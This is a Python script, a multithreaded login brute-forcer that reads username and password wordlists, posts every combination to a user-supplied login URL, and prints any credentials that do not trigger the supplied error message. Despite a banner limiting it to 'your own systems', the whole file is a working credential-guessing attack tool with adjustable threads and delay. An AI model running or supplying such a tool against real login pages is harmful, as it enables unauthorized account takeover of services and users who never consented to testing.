import requests
import time
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

def try_login(url, username, password, error_msg, session):
    payload = {"username": username, "password": password}
    try:
        response = session.post(url, data=payload, timeout=10)
        if error_msg not in response.text:
            return (True, username, password)
        return (False, username, password)
    except requests.exceptions.ConnectionError:
        print(f"[!] Connection refused. Is the server running at {url}?")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print(f"[!] Request timed out for {username}:{password}")
        return (False, username, password)
    except requests.exceptions.RequestException as e:
        print(f"[!] Request error: {e}")
        return (False, username, password)

def load_file(filepath):
    try:
        with open(filepath, 'r', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] File not found: {filepath}")
        sys.exit(1)

def main():
    print("=" * 45)
    print("       Local Login Bruteforcer v2.0")
    print("    For use on your own systems only.")
    print("=" * 45)

    url      = input("\n[?] Enter the URL           : ").strip()
    u_file   = input("[?] Enter the username file : ").strip()
    p_file   = input("[?] Enter the password file : ").strip()
    error    = input("[?] Paste the error message : ").strip()
    delay    = float(input("[?] Delay between requests (seconds, e.g. 0.3): ").strip() or "0.3")
    threads  = int(input("[?] Number of threads (e.g. 5): ").strip() or "5")

    usernames = load_file(u_file)
    passwords = load_file(p_file)

    total = len(usernames) * len(passwords)
    print(f"\n[*] Loaded {len(usernames)} usernames, {len(passwords)} passwords ({total} combinations)")
    print(f"[*] Starting attack on {url}\n")

    found   = False
    checked = 0

    with requests.Session() as session:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {
                executor.submit(try_login, url, u, p, error, session): (u, p)
                for u in usernames
                for p in passwords
            }

            for future in as_completed(futures):
                if found:
                    future.cancel()
                    continue

                success, username, password = future.result()
                checked += 1
                print(f"[*] ({checked}/{total}) Trying {username}:{password}")

                if success:
                    print(f"\n[+] MATCH FOUND!")
                    print(f"    Username : {username}")
                    print(f"    Password : {password}")
                    found = True

                time.sleep(delay)

    if not found:
        print("\n[-] No valid credentials found.")

if __name__ == "__main__":
    main()
